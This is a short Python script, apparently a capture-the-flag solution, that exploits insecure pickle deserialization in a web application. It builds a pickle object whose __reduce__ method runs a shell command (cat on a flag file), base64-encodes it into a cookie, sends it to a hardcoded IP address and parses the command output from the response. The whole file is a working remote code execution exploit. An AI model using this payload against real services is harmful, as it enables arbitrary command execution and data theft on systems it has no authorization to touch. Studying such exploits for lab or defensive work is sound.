
import pickle
import os
import base64
import subprocess
import requests
from bs4 import BeautifulSoup

class ani_pickle_serum:
    def __reduce__(self):
        #return subprocess.check_output, (['ls'],)
        return subprocess.check_output, (['cat','flag_wIp1b'],)

def gen_payload():
    payload=pickle.dumps({'serum':ani_pickle_serum()},protocol=0)
    #print("Payload: "+str(payload).strip('b').strip('\''))
    encoded_payload=base64.b64encode(payload)
    print("Payload base64: "+str(encoded_payload).strip('b').strip('\''))
    #return str(encoded_payload).strip('b').strip('\'')
    return encoded_payload

def send_payload():
    url="http://94.237.63.201:32941/"
    cookies={
        'plan_b':gen_payload()
    }
    response=requests.get(url,cookies=cookies)
    
    if response.status_code==200:
        soup=BeautifulSoup(response.text,'html.parser')
        span_element=soup.find('span')
        response_int=str(span_element).strip("<span>").strip("</span>")
        print(response_int)
    else:
        print(response)

global command 
command='ls .'
send_payload()